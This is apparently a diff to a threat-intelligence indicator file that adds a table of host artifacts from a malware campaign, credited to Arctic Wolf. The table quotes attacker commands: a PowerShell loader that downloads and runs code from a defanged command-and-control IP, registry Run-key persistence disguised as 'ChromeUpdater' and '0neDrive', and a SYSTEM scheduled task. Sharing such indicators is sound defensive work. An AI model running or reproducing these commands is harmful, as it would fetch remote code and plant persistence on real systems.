@@ -165,3 +165,17 @@ b28a9062100a7fbf0f65dbb23db319717c4e613e890d0a3f1ae27ec6e34cf35a
 | 168.119.96[.]41  | C2 | Command and Control | 2025-06-10 | Arctic Wolf |
 
 ---
+
+## 🖥️ System Artifacts
+
+### Table View
+| Host Artifact | Details | Source |
+|---------------|---------|--------|
+| `PowerShell.exe -w h -c "iex $(irm 138[.]199.156[.]22:8080/$($z = [datetime]::UtcNow; $y = ([datetime]('01/01/' + '1970')); $x = ($z – $y).TotalSeconds; $w = [math]::Floor($x); $v = $w – ($w % 16); [int64]$v))"` | Observed PowerShell C2 loader | Arctic Wolf |
+| `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ChromeUpdater" /t REG_SZ /d "C:\Users\<redacted>\AppData\Roaming\node-v22.11.0-win-x64\node.exe C:\Users\<redacted>\AppData\Roaming\node-v22.11.0-win-x64\p16iir70.log" /f` | Registry Key Used to Establish Persistence | Arctic Wolf |
+| `schtasks /create /sc DAILY /tn "TaskSystem" /tr "cmd /C cd %s && %s" /st 20:00 /ru system > nul` | Scheduled Task | Arctic Wolf |
+| `C:\Users\<redacted>\AppData\Roaming\node-v22.11.0-win-x64\node.exe` | File Artifact | Arctic Wolf |
+| `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 0neDrive /t REG_SZ /d` | Registry Key | Arctic Wolf |
+| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ChromeUpdater` | Registry Key | Arctic Wolf |
+
+---
